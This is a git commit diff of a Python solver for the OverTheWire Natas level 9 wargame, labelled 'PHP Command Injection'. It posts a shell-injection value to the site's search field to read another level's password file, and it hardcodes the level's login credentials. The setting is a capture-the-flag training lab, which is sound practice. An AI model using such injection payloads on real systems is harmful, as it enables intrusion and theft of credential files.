8653c0397e1e38321c89463524f5f353236ce504
Romain <rmtestard@gmail.com>
2019-02-03 20:36:58 +0100

    PHP Command Injection

--- natas9.py
+++ natas9.py
@@ -7,14 +7,16 @@ import re
 username = 'natas9'
 password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
 
-url = 'http://%s.natas.labs.overthewire.org/' % username
+url = f'http://{username}.natas.labs.overthewire.org/'
 
-# response = requests.get(url, auth=(username, password))
+# response = requests.get(url + 'index-source.html', auth=(username, password))
 response = requests.post(url, data={
                          'needle': '. /etc/natas_webpass/natas10; #', 'submit': 'submit'}, auth=(username, password))
 content = response.text
+output = open('output.html', 'w')
+output.write(content)
 
 print(content)
-print(re.findall('<pre>\n(.*)\n</pre>', content))
+# print(re.findall('<pre>\n(.*)\n</pre>', content))
 
 # PHP Command Injection
